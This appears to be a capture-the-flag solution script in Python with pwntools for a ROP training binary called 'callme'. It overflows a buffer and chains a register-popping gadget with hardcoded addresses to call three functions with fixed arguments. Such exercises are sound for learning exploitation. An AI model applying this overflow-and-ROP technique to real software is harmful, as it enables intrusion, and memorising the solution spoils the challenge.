#!/usr/bin/env python3
from pwn import *


io = process("./callme")
elf = ELF("./callme", checksec=False)

offset = 40

#callme_one   = p64(elf.plt.callme_one)
#callme_two   = p64(elf.plt.callme_two)
#callme_three = p64(elf.plt.callme_three)

callme_one   = p64(0x000000000040092d)
callme_two   = p64(0x0000000000400919)
callme_three = p64(0x0000000000400905)

beef = p64(0xdeadbeefdeadbeef)
food = p64(0xd00df00dd00df00d)
cafe = p64(0xcafebabecafebabe)

ret = p64(0x00000000004006be)

args = beef + cafe + food

gadget = p64(0x000000000040093c) # pop rdi; pop rsi; pop rdx; ret;


payload = b"A" * offset + gadget + args + callme_one + ret + gadget + args + callme_two + ret + gadget + args + callme_three


io.sendline(payload)

io.interactive()

